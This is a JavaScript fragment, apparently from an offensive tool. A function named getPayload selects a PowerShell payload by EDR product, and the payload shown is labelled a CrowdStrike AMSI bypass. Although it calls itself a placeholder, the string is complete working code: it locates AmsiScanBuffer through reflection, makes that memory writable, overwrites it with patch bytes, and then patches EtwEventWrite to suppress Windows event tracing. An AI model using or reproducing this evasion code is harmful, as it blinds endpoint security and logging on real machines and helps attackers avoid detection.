...
function getPayload(edr) {
    ...
    const crowdStrikePayload = `#CrowdStrike AMSI Bypass (Placeholder) \n$asm=[AppDomain]::CurrentDomain.GetAssemblies()|?{$_.GlobalAssemblyCache -and $_.Location.EndsWith('System.dll')};$typ=$asm.GetType('Microsoft.Win32.UnsafeNativeMethods');$mth=$typ.GetMethods()|?{$_.Name -cmatch '^Ge.*P.*oc.*ddress$'};$mod=$typ.GetMethod('GetModuleHandle');$amh=$mod.Invoke($null,@('amsi.dll'));$p=$mth[0].Invoke($null,@($amh,'AmsiScanBuffer'));$ab=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflectedDelegate')),[Reflection.Emit.AssemblyBuilderAccess]::Run);$mb=$ab.DefineDynamicModule('InMemoryModule',$false);$pt=@([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType());$rt=[Bool];$tb=$mb.DefineType('MyDelegateType','Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate]);$cb=$tb.DefineConstructor('RTSpecialName,HideBySig,Public',[Reflection.CallingConventions]::Standard,$pt);$cb.SetImplementationFlags('Runtime,Managed');$dm=$tb.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$rt,$pt);$dm.SetImplementationFlags('Runtime,Managed');$dt=$tb.CreateType();$vpm=$mod.Invoke($null,@('kernel32.dll'));$vpp=$mth[0].Invoke($null,@($vpm,'VirtualProtect'));$v=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpp,$dt);$o=0;$pr=$v.Invoke($p,3,0x40,[ref]$o);Start-Sleep 1;[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x00,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3),0,$p,12);$emh=$mod.Invoke($null,@('ntdll.dll'));$e=$mth[0].Invoke($null,@($emh,'EtwEventWrite'));$o=0;$pr=$v.Invoke($e,3,0x40,[ref]$o);$s=[Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]);if($s -eq 8){[Runtime.InteropServices.Marshal]::WriteByte($e,0xC3)}else{[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0xff,0x55),0,$e,3)}`;
